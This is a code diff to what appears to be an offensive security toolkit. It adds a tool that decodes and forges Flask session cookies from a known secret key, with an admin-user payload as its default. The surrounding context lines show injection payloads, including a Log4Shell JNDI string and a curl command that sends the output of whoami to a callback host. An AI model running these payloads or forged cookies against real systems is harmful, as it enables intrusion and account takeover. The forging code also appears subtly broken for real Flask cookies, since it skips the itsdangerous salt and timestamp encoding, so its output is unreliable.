@@ -658,3 +658,86 @@ def oast_payload(domain: str, keyword: str = "{{uname}}") -> str:
         f"Log4Shell: ${{jndi:ldap://{host}/a}}\n"
         f"Shell injection: ; curl http://{host}/$(whoami) | ping -c1 {host}\n"
     )
+
+@tool(category="web")
+def flask_session(session_cookie: str, secret: str = "", action: str = "decode", payload_json: str = '{"user":"admin"}', digest: str = "sha1") -> str:
+    """Decode or forge a Flask session cookie (itsdangerous URLSafeTimedSerializer format: base64(zlib(json)).timestamp.signature).
+
+    Decode mode parses payload, timestamp, and (with secret) verifies the HMAC.
+    Forge mode builds a signed cookie for any JSON payload using the given secret.
+
+    :param session_cookie: the session cookie value (eyJ... or empty for forge)
+    :param secret: Flask SECRET_KEY (verification for decode, signing for forge)
+    :param action: decode or forge
+    :param payload_json: JSON payload to embed when action=forge
+    :param digest: HMAC digest for the signature (sha1 default, sha256 supported)
+    """
+    import base64 as _b64
+    import hashlib as _hl
+    import hmac as _hm
+    import time as _tm
+    import zlib as _zl
+
+    def _b64url_d(s: str) -> bytes:
+        pad = "=" * (-len(s) % 4)
+        return _b64.urlsafe_b64decode(s + pad)
+
+    def _b64url_e(b: bytes) -> str:
+        return _b64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+    def _decode_payload(part: str) -> bytes:
+        raw = _b64url_d(part)
+        try:
+            return _zl.decompress(raw)
+        except Exception:
+            return raw
+
+    def _sign(data_b64: str, ts: str, key: str, dig: str) -> str:
+        msg = (data_b64 + "." + ts).encode() if ts else data_b64.encode()
+        mac = _hm.new(key.encode(), msg, getattr(_hl, dig)).digest()
+        return _b64url_e(mac)
+
+    if action == "forge":
+        try:
+            payload = json.loads(payload_json)
+        except (ValueError, TypeError):
+            return "ERROR: payload_json must be valid JSON"
+        if not secret:
+            return "ERROR: secret required for forge (Flask SECRET_KEY)"
+        raw = json.dumps(payload, separators=(",", ":")).encode()
+        compressed = _zl.compress(raw)
+        enc = compressed if len(compressed) < len(raw) else raw
+        data_b64 = _b64url_e(enc)
+        ts = str(int(_tm.time()))
+        sig = _sign(data_b64, ts, secret, digest)
+        return f"forged session cookie:\n{data_b64}.{ts}.{sig}"
+    # decode
+    if not session_cookie:
+        return "ERROR: session_cookie required for decode"
+    parts = session_cookie.split(".")
+    if len(parts) == 3:
+        data_b64, ts, sig = parts
+    elif len(parts) == 2:
+        data_b64, sig = parts
+        ts = ""
+    else:
+        return "ERROR: not a Flask cookie (expected base64[.timestamp].signature)"
+    try:
+        payload = _decode_payload(data_b64)
+        parsed = json.loads(payload)
+    except Exception:
+        parsed = None
+    lines = [f"payload (decoded): {payload.decode('utf-8', 'replace')}"]
+    if parsed is not None:
+        lines.append(f"payload (json): {json.dumps(parsed, indent=2)}")
+    if ts:
+        lines.append(f"timestamp: {ts} ({_tm.strftime('%Y-%m-%d %H:%M:%S', _tm.gmtime(int(ts)))} UTC)")
+    lines.append(f"signature: {sig}")
+    if secret:
+        expected = _sign(data_b64, ts, secret, digest)
+        lines.append(f"signature check (secret={secret!r}, {digest}): {'VALID' if _hm.compare_digest(expected, sig) else 'INVALID'}")
+    else:
+        lines.append("signature check: pass --secret to verify")
+    if parsed is not None and "user" in parsed:
+        lines.append(f"user claim: {parsed['user']}")
+    return "\n".join(lines)
